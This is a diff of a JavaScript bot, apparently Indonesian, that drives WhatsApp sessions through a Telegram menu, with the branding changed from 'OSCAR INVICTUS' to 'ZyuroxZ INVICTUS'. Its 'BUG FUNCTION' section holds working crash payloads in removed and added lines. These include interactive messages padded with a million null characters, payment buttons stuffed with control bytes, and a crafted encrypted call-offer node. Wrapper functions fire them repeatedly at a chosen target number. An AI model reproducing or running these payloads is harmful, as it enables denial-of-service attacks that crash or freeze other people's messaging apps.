@@ -1,5 +1,5 @@
 const {
-    default: makeWASocket,
+    default: makeWAbotet,
     useMultiFileAuthState,
     downloadContentFromMessage,
     emitGroupParticipantsUpdate,
@@ -61,7 +61,7 @@ const {
     Browsers,
     GroupSettingChange,
     DisconnectReason,
-    WASocket,
+    WAbotet,
     getStream,
     WAProto,
     isBaileys,
@@ -161,31 +161,26 @@ bot.on("polling_error", (err) => {
 
 function startBot() {
   console.log(chalk.red(`
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⣉⣉⣥⣤⣤⣤⣤⣤⣤⣤⣈⣉⡙⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⣡⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠙⢿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⠿⣻⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⢛⣛⣛⡛⠛⠿⢿⣿⣿⣿⣿⣿⣿⡻⢿⣿⣿⣿⣷⣄⠹⣿⣿⣿⣿⣿
-⣿⣿⣿⡿⠋⣰⣿⡿⠿⠟⠉⣠⣾⣿⣿⣿⠟⣋⣿⡿⣫⣴⡾⣱⣿⢸⣧⢻⣶⣍⠲⣮⣝⡻⢿⣿⣿⣿⣦⠈⠙⠛⢿⣿⣦⠈⢿⣿⣿⣿
-⣿⣿⡿⠁⣼⣿⠋⣰⠃⢀⠜⣿⣿⡿⢋⣴⣟⡻⢋⣼⣿⣿⢡⣿⣿⣼⣿⣆⢻⣿⣷⡌⢿⣛⣧⣝⢿⣿⣿⡁⡄⠈⢧⠙⢿⣷⡀⢻⣿⣿
-⣿⣿⠁⣾⠟⡅⠀⡧⠒⠁⣼⣿⢏⣴⣿⣿⡿⢣⣾⣾⣿⡅⣿⠋⠡⢌⠉⢻⣾⣿⣶⣿⣎⢻⣿⣿⣷⣝⢿⣷⡈⠓⢬⡄⠈⡙⣷⡀⢻⣿
-⣿⠃⣼⡏⢸⡇⠈⢀⡄⣾⡿⣡⣿⣿⣿⣿⢣⣿⣿⣿⣿⣷⣿⣷⣾⠈⣀⣼⣿⣿⣿⣿⣿⡎⢿⣿⣿⣿⣎⢻⣿⡀⡀⠁⢀⡇⠘⣷⠈⣿
-⡟⢠⣿⠁⠀⡇⠔⠉⣸⣿⢡⣿⣿⣭⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢼⣿⣿⣿⣿⣿⣿⣿⣿⣼⣟⣿⣿⣿⡆⢿⣧⠈⠳⣘⡇⠀⣿⡇⢸
-⠃⢸⠏⡄⠀⠇⢀⣴⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣄⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣿⡇⠀⠘⠃⢀⡿⣿⠈
-⠀⣿⠀⢿⡀⢠⡞⢸⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢻⣇⠹⣄⠀⣼⠃⣿⡀
-⠀⣿⡀⠈⣧⡏⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⢠⣿⠆⠐⢾⡇⠈⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢾⣿⡀⠙⣦⠃⠀⣿⡇
-⠀⣿⣧⠀⠸⠀⢰⢻⣿⠻⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⣼⣿⡏⠸⣿⣿⠀⠀⠀⠀⠀⠈⢹⣿⣿⣿⣿⣿⡇⣾⡿⣇⠀⡏⠀⣸⣿⠁
-⡄⢸⠈⢷⡄⠀⡿⠀⣿⡇⢿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⣿⡟⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⢁⣿⠃⢹⡀⢀⣼⠃⣿⠀
-⣧⠘⣧⠀⠙⢦⡇⠀⠙⢿⡜⣿⢟⣛⣭⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⣭⣝⣛⠿⠏⣾⢏⠀⢸⡥⠋⠁⣰⡇⢸
-⣿⡄⢻⡷⣄⠀⠃⠀⢸⠈⢷⡙⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⢏⡼⠃⣾⠀⠘⠁⢀⢼⡿⢀⣿
-⣿⣷⡀⢿⡈⠳⣤⡀⠘⡇⠈⢿⣮⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣣⣾⠃⢠⡇⢀⣠⠶⢋⣼⠃⣼⣿
-⣿⣿⣷⡀⢻⣄⡀⠉⠓⠾⡀⠘⡌⠻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠟⢩⠆⠀⡼⠚⠋⠁⣠⡾⠃⣼⣿⣿
-⣿⣿⣿⣷⡄⠹⣿⡢⣄⣀⡀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⢀⣀⣠⠴⣾⡟⢁⣼⣿⣿⣿
-⣿⣿⣿⣿⣿⣦⡈⢿⣦⣉⠉⠛⠛⠚⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠃⠚⠛⠉⢉⣤⡾⠋⣠⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣄⡙⠿⣿⡒⠶⠦⠶⠶⠾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⠶⠶⠴⠶⢖⣾⡿⠋⣠⣾⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣈⠛⢷⣦⣤⣄⣤⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⡶⠟⢉⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣈⠙⠻⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠿⠛⣉⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+███╗░░██╗░█████╗░██████╗░████████╗██╗░░██╗██╗░░██╗
+████╗░██║██╔══██╗██╔══██╗╚══██╔══╝╚██╗██╔╝██║░░██║
+██╔██╗██║██║░░██║██████╔╝░░░██║░░░░╚███╔╝░███████║
+██║╚████║██║░░██║██╔══██╗░░░██║░░░░██╔██╗░██╔══██║
+██║░╚███║╚█████╔╝██║░░██║░░░██║░░░██╔╝╚██╗██║░░██║
+╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝
+
+⠀⠀⠀⠀⡀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
+⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
+⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
+⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
+⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
+⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
+⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
+⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
+⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
+⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
+⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁
 `));
 
 
@@ -200,9 +195,7 @@ console.log(chalk.blue(`
 `));
 };
 
-validateToken();
-
-let sock;
+let bot;
 
 function saveActiveSessions(botNumber) {
   try {
@@ -232,7 +225,7 @@ async function initializeWhatsAppConnections() {
         const sessionDir = createSessionDir(botNumber);
         const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
 
-        sock = makeWASocket ({
+        bot = makeWAbotet ({
           auth: state,
           printQRInTerminal: true,
           logger: P({ level: "silent" }),
@@ -241,11 +234,11 @@ async function initializeWhatsAppConnections() {
 
         // Tunggu hingga koneksi terbentuk
         await new Promise((resolve, reject) => {
-          sock.ev.on("connection.update", async (update) => {
+          bot.ev.on("connection.update", async (update) => {
             const { connection, lastDisconnect } = update;
             if (connection === "open") {
               console.log(`Bot ${botNumber} terhubung!`);
-              sessions.set(botNumber, sock);
+              sessions.set(botNumber, bot);
               resolve();
             } else if (connection === "close") {
               const shouldReconnect =
@@ -260,7 +253,7 @@ async function initializeWhatsAppConnections() {
             }
           });
 
-          sock.ev.on("creds.update", saveCreds);
+          bot.ev.on("creds.update", saveCreds);
         });
       }
     }
@@ -281,7 +274,7 @@ async function connectToWhatsApp(botNumber, chatId) {
   let statusMessage = await bot
     .sendMessage(
       chatId,
-      `\`\`\`OSCAR INVICTUS
+      `\`\`\`ZyuroxZ INVICTUS
 ╰➤ Number  : ${botNumber} 
 ╰➤ Status : Loading...\`\`\`
 `,
@@ -292,14 +285,14 @@ async function connectToWhatsApp(botNumber, chatId) {
   const sessionDir = createSessionDir(botNumber);
   const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
 
-  sock = makeWASocket ({
+  bot = makeWAbotet ({
     auth: state,
     printQRInTerminal: false,
     logger: P({ level: "silent" }),
     defaultQueryTimeoutMs: undefined,
   });
 
-  sock.ev.on("connection.update", async (update) => {
+  bot.ev.on("connection.update", async (update) => {
     const { connection, lastDisconnect } = update;
 
     if (connection === "close") {
@@ -320,7 +313,7 @@ async function connectToWhatsApp(botNumber, chatId) {
       } else {
         await bot.editMessageText(
           `
-\`\`\`OSCAR INVICTUS
+\`\`\`ZyuroxZ INVICTUS
 ╰➤ Number  : ${botNumber} 
 ╰➤ Status : Gagal Tersambung\`\`\`
 `,
@@ -337,10 +330,10 @@ async function connectToWhatsApp(botNumber, chatId) {
         }
       }
     } else if (connection === "open") {
-      sessions.set(botNumber, sock);
+      sessions.set(botNumber, bot);
       saveActiveSessions(botNumber);
       await bot.editMessageText(
-        `\`\`\`OSCAR INVICTUS
+        `\`\`\`ZyuroxZ INVICTUS
 ╰➤ Number  : ${botNumber} 
 ╰➤ Status : Pairing
 ╰➤Pesan : Succes Pairing\`\`\`
@@ -355,11 +348,11 @@ async function connectToWhatsApp(botNumber, chatId) {
       await new Promise((resolve) => setTimeout(resolve, 1000));
       try {
         if (!fs.existsSync(`${sessionDir}/creds.json`)) {
-          const code = await sock.requestPairingCode(botNumber);
+          const code = await bot.requestPairingCode(botNumber);
           const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
           await bot.editMessageText(
             `
-\`\`\`OSCAR INVICTUS
+\`\`\`ZyuroxZ INVICTUS
 ╰➤ Number  : ${botNumber} 
 ╰➤ Status : Pairing\`\`\`
 ╰➤ Kode : \`\`${formattedCode}\`\``,
@@ -374,7 +367,7 @@ async function connectToWhatsApp(botNumber, chatId) {
         console.error("Error requesting pairing code:", error);
         await bot.editMessageText(
           `
-    \`\`\`OSCAR INVICTUS
+    \`\`\`ZyuroxZ INVICTUS
 ╰➤ Number  : ${botNumber} 
 ╰➤ Status : Erorr❌
 *╰➤ Pesan* : ${error.message}\`\`\``,
@@ -388,9 +381,9 @@ async function connectToWhatsApp(botNumber, chatId) {
     }
   });
 
-  sock.ev.on("creds.update", saveCreds);
+  bot.ev.on("creds.update", saveCreds);
 
-  return sock;
+  return bot;
 }
 
 
@@ -531,240 +524,154 @@ async function updateProgress(bot, chatId, message, percentage, status) {
 
 
 // [ BUG FUNCTION ]
-async function crashnull(sock, targetPtcp = true) {
-  const mentionedJid = [
-    "0@s.whatsapp.net",
-    ...Array.from(
-      { length: 1900 },
-      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-    )
-  ];
-  
-  const randomJid = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";
-  const contextParticipant = targetPtcp ? sock : randomJid;
+async function fc(bot, target){
 
-  const nativeFlowMessages = [
-    {
-      name: 'call_permission_request',
-      paramsJson: `\u0000`.repeat(1065000),
-      icon: "promotion",
-      version: 3
-    },
-    {
-      name: 'single_select',
-      paramsJson: `\u0000`.repeat(1065000),
-      icon: "promotion",
-      version: 3
-    },
-    {
-      name: 'form_message',
-      paramsJson: `\u0000`.repeat(1065000),
-      icon: "promotion",
-      version: 3
-    },
-    {
-      name: 'address_message',
-      paramsJson: `\u0000`.repeat(1065000),
-      icon: "promotion",
-      version: 3
-    }
-  ];
+    const {
+        encodeSignedDeviceIdentity,
+        jidEncode,
+        jidDecode,
+        encodeWAMessage,
+        patchMessageBeforeSending,
+        encodeNewsletterMessage
+    } = require("@whiskeysockets/baileys");
 
-  await sock.relayMessage(sock, {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          header: {
-            title: "",
-            hasMediaAttachment: false
-          },
-          body: {
-            text: "⌁⃰𝐓𝐞‌𝐝𝐞‌𝐱 𝐗‌𝟔༑"
-          },
-          nativeFlowResponseMessage: nativeFlowMessages[0],
-          nativeFlowMessages: nativeFlowMessages,
-          contextInfo: {
-            participant: contextParticipant,
-            mentionedJid: mentionedJid,
-            remoteJid: "X",
-            stanzaId: "123",
-            quotedMessage: {
-              paymentInviteMessage: {
-                serviceType: 3,
-                expiryTimestamp: Date.now() + 1814400000
-              },
-              forwardedAiBotMessageInfo: {
-                botName: "META AI",
-                botJid: randomJid,
-                creatorName: "Bot"
-              }
+    let devices = (
+        await bot.getUSyncDevices([target], false, false)
+    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
+
+    await bot.assertSessions(devices);
+
+    let xnxx = () => {
+        let map = {};
+        return {
+            mutex(key, fn) {
+                map[key] ??= { task: Promise.resolve() };
+                map[key].task = (async prev => {
+                    try { await prev; } catch { }
+                    return fn();
+                })(map[key].task);
+                return map[key].task;
             }
-          },
-          carouselMessage: {
-            messageVersion: 1,
-            cards: cardss
-          }
-        },
-        interactiveResponseMessage: {
-          body: {
-            text: "MY LIFE STYLE",
-            format: "DEFAULT"
-          },
-          externalAdReply: {
-            showAdAttribution: true,
-            title: "🩸⃟༑⌁⃰𝐙𝐞‌𝐫𝐨 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠️",
-            body: "",
-            thumbnailUrl: null,
-            sourceUrl: "HTTP://WA.ME/STICKERPACK/settings/call",
-            mediaType: 1,
-            renderLargerThumbnail: true
-          },
-          businessMessageForwardInfo: {
-            businessOwnerJid: sock
-          },
-          dataSharingContext: {
-            showMmDisclosure: true
-          },
-          quotedMessage: {
-            paymentInviteMessage: {
-              serviceType: 2,
-              expiryTimestamp: null
-            }
-          }
-        }
-      }
-    }
-  }, { 
-    participant: { jid: sock },
-    quoted: null,
-    useraJid: null,
-    messageId: null
-  });
-}
-
-async function mikirKidz(target) {
-  try {
-    let message = {
-      interactiveMessage: {
-        body: { text: "X" },
-        nativeFlowMessage: {
-          buttons: [
-            {
-              name: "payment_method",
-              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
-                0x2710
-              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
-            },
-          ],
-          messageParamsJson: "{}",
-        },
-      },
+        };
     };
 
-    for (let iterator = 0; iterator < 1; iterator++) {
-      const msg = generateWAMessageFromContent(target, message, {});
+    let memek = xnxx();
+    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
+    let porno = bot.createParticipantNodes.bind(bot);
+    let yntkts = bot.encodeWAMessage?.bind(bot);
 
-      await sock.relayMessage(target, msg.message, {
-        additionalNodes: [
-          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
-        ],
-        messageId: msg.key.id,
-        participant: { jid: target },
-        userJid: target,
-      });
+    bot.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
+        if (!recipientJids.length)
+            return { nodes: [], shouldIncludeDeviceIdentity: false };
 
-      await sock.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: { native_flow_name: "payment_method" },
+        let patched = await (bot.patchMessageBeforeSending?.(message, recipientJids) ?? message);
+        let ywdh = Array.isArray(patched)
+            ? patched
+            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
+
+        let { id: meId, lid: meLid } = bot.authState.creds.me;
+        let omak = meLid ? jidDecode(meLid)?.user : null;
+        let shouldIncludeDeviceIdentity = false;
+
+        let nodes = await Promise.all(
+            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
+
+                let { user: targetUser } = jidDecode(jid);
+                let { user: ownPnUser } = jidDecode(meId);
+
+                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
+                let y = jid === meId || jid === meLid;
+
+                if (dsmMessage && isOwnUser && !y)
+                    msg = dsmMessage;
+
+                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
+
+                return memek.mutex(jid, async () => {
+                    let { type, ciphertext } = await bot.signalRepository.encryptMessage({
+                        jid,
+                        data: bytes
+                    });
+
+                    if (type === 'pkmsg')
+                        shouldIncludeDeviceIdentity = true;
+
+                    return {
+                        tag: 'to',
+                        attrs: { jid },
+                        content: [{
+                            tag: 'enc',
+                            attrs: { v: '2', type, ...extraAttrs },
+                            content: ciphertext
+                        }]
+                    };
+                });
+            })
+        );
+
+        return {
+            nodes: nodes.filter(Boolean),
+            shouldIncludeDeviceIdentity
+        };
+    };
+
+    let awik = crypto.randomBytes(32);
+    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
+
+    let {
+        nodes: destinations,
+        shouldIncludeDeviceIdentity
+    } = await bot.createParticipantNodes(
+        devices,
+        { conversation: "y" },
+        { count: '0' }
+    );
+
+    let callNode = {
+        tag: "call",
+        attrs: {
+            to: target,
+            id: bot.generateMessageTag(),
+            from: bot.user.id
+        },
+        content: [{
+            tag: "offer",
+            attrs: {
+                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
+                "call-creator": bot.user.id
+            },
             content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: undefined,
-                  },
-                ],
-              },
-            ],
-          },
-        ],
-      });
-
-      await new Promise((resolve) => setTimeout(resolve, 500));
-    }
-
-    console.log("BUG TERKIRIM");
-  } catch (err) {
-    console.error(calik.red.bold(err));
-  }
-}
-
-async function ForceInfinity(target) {
-  try {
-    let message = {
-      interactiveMessage: {
-        body: { text: "𝙓𝙔𝙍𝙊𝙎 𝙈𝙊𝙊𝙉" },
-        nativeFlowMessage: {
-          buttons: [
-            {
-              name: "payment_method",
-              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
-                0x2710
-              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
-            },
-          ],
-          messageParamsJson: "{}",
-        },
-      },
-    };
-
-    const msg = generateWAMessageFromContent(target, message, {});
-
-    await sock.relayMessage(target, msg.message, {
-      additionalNodes: [
-        { tag: "biz", attrs: { native_flow_name: "payment_method" } },
-      ],
-      messageId: msg.key.id,
-      participant: { jid: target },
-      userJid: target,
-    });
-
-    await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: { native_flow_name: "payment_method" },
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
+                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
+                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                 {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: undefined,
+                    tag: "video",
+                    attrs: {
+                        orientation: "0",
+                        screen_width: "1920",
+                        screen_height: "1080",
+                        device_orientation: "0",
+                        enc: "vp8",
+                        dec: "vp8"
+                    }
                 },
-              ],
-            },
-          ],
-        },
-      ],
-    });
-
-    console.log("𝙁𝙤𝙧𝙘𝙚 𝙃𝙖𝙧𝙙 𝙓𝙮𝙧𝙤𝙨 𝙨𝙪𝙘𝙘𝙚𝙨 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩");
-  } catch (err) {
-    console.error(calik.red.bold(err));
-  }
+                { tag: "net", attrs: { medium: "3" } },
+                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
+                { tag: "encopt", attrs: { keygen: "2" } },
+                { tag: "destination", attrs: {}, content: destinations },
+                ...(shouldIncludeDeviceIdentity
+                    ? [{
+                        tag: "device-identity",
+                        attrs: {},
+                        content: encodeSignedDeviceIdentity(bot.authState.creds.account, true)
+                    }]
+                    : []
+                )
+            ]
+        }]
+    };
+    await bot.sendNode(callNode);
 }
+
 // [ END FUNCTION ]
 async function Delayy(target) {
  for (let i = 0; i < 10; i++) {
@@ -776,7 +683,7 @@ async function Delayy(target) {
  await sleep(350);
  await LocationDelayCore(target);
  await sleep(350);
-console.log(chalk.blueBright(`OSCAR Delay Sending Bug 🦠 `));
+console.log(chalk.blueBright(`ZyuroxZ Delay Sending Bug 🦠 `));
   }
   }
 
@@ -788,7 +695,7 @@ async function Uikontol(target) {
  await sleep(1000);
  await SpcmUi(target);
  await sleep(1000);
-console.log(chalk.blueBright(`OSCAR ui Sending Bug 🦠 `));
+console.log(chalk.blueBright(`ZyuroxZ ui Sending Bug 🦠 `));
   }
   }
   
@@ -800,7 +707,7 @@ async function blankmemek(target) {
  await sleep(1000);
  await ComboBlank(target)
  await sleep(1000);
- console.log(chalk.blueBright(`OSCAR blank Sending Bug 🦠 `));
+ console.log(chalk.blueBright(`ZyuroxZ blank Sending Bug 🦠 `));
   }
   }  
 
@@ -812,7 +719,7 @@ async function Feeeze(target) {
  await sleep(1000);
  await uiKiller(target);
  await sleep(1000);
- console.log(chalk.blueBright(`OSCAR Feeeze Sending Bug 🦠 `));
+ console.log(chalk.blueBright(`ZyuroxZ Feeeze Sending Bug 🦠 `));
   }
   }
        
@@ -847,7 +754,7 @@ if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) 
 }
 
   bot.sendPhoto(chatId, randomImage, {
-    caption: `<blockquote>交 OSCAR INVICTUS ᝄ</blockquote>
+    caption: `<blockquote>交 ZyuroxZ INVICTUS ᝄ</blockquote>
 ( 👀 ) Holaa ☇ . use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
 <blockquote># 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭</blockquote>
 ⬡ Author : @VallOffcial
@@ -856,16 +763,16 @@ if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) 
 ⬡ Library : Javascript
 ⬡ Runtime : ${runtime}
 ⬡ Date now : ${date}
-<blockquote>© OSCAR INVICTUS ᝄ</blockquote>
+<blockquote>© ZyuroxZ INVICTUS ᝄ</blockquote>
 `,
     parse_mode: 'HTML',
     reply_markup: {
       inline_keyboard: [
-        [{ text: "OSCAR BUG" , callback_data: "bugmenu" }, 
+        [{ text: "ZyuroxZ BUG" , callback_data: "bugmenu" }, 
         { text: "THANKS TO", callback_data: "thanksto" }],
         [{ text: "OWNER MENU", callback_data: "ownermenu" }],
-        [{ text: "DEV OSCAR", url: "https://t.me/VallOffcial" }, 
-        { text: "INFORMASI", url: "https://t.me/OscarInvictus" }]
+        [{ text: "DEV ZyuroxZ", url: "https://t.me/VallOffcial" }, 
+        { text: "INFORMASI", url: "https://t.me/ZyuroxZInvictus" }]
       ]
     }
   });
@@ -882,19 +789,19 @@ bot.on("callback_query", (callbackQuery) => {
   let newButtons = [];
 
   if (data === "bugmenu") {
-    newCaption = `<blockquote><b>( ! ) - OSCAR INVICTUS</b>
+    newCaption = `<blockquote><b>( ! ) - ZyuroxZ INVICTUS</b>
 <b>𝙳𝚊𝚏𝚝𝚊𝚛 𝚏𝚒𝚝𝚞𝚛 𝚎𝚔𝚜𝚙𝚕𝚘𝚒𝚝 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚜𝚎𝚍𝚒𝚊.</b>
 
